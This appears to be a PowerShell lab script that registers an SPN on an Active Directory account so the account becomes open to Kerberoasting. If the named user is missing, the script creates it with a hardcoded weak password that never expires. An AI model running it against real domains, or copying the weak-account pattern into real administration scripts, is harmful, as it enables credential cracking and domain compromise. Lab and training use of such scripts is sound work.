<#
.SYNOPSIS
Adds a Service Principal Name (SPN) to a specified Active Directory user account.

.DESCRIPTION
This script adds a Service Principal Name (SPN) to an AD user account.  
SPNs are used in Kerberos authentication. If an SPN is registered to a user account, 
that account can be targeted with Kerberoasting attacks.  

If the specified user does not exist, the script will create it with a default password 
(P@ssw0rd123!) and enable the account.

.REQUIREMENTS
- ActiveDirectory PowerShell module (RSAT tools).
- Permissions to modify the target user account (e.g., GenericWrite or higher).
- Domain-joined machine.

.PARAMETER UserIdentity
The AD user to modify (e.g., "svc-sql").  
If the user does not exist, a new account will be created.

.PARAMETER ServicePrincipalName
The SPN string to add (e.g., "MSSQLSvc/sql.srv.local:1433").

.EXAMPLE
PS> .\add_spn_for_kerberosting.ps1 -UserIdentity "svc-sql" -ServicePrincipalName "MSSQLSvc/sql.srv.local:1433"
Adds the MSSQLSvc SPN to the svc-sql account, enabling Kerberoasting attacks.

.NOTES
Author: Phoenix (example)
Attack Technique: SPN Abuse / Kerberoasting
Use only in lab or test environments.
#>

param(
	[Parameter(Mandatory=$true)]
	[string]$UserIdentity,

	[Parameter(Mandatory=$true)]
	[string]$ServicePrincipalName
)

$user = Get-ADUser -Identity $UserIdentity -Properties userAccountControl -ErrorAction SilentlyContinue
if (-not $user)
{
	Write-Host "User '$UserIdentity' not found. Creating new user..."
	# Adjust these parameters as needed for your environment
	New-ADUser -Name $UserIdentity `
		-SamAccountName $UserIdentity `
		-AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
		-Enabled $true `
		-PasswordNeverExpires $true
	# Optionally, re-fetch the user object
	$user = Get-ADUser -Identity $UserIdentity -Properties userAccountControl
}

# Ensure the AD module is available
if (-not (Get-Module -ListAvailable -Name ActiveDirectory))
{
	Write-Error "ActiveDirectory module not found. Please install RSAT tools."
	exit
}
Import-Module ActiveDirectory

Set-ADUser -Identity $UserIdentity -ServicePrincipalNames @{Add=$ServicePrincipalName}
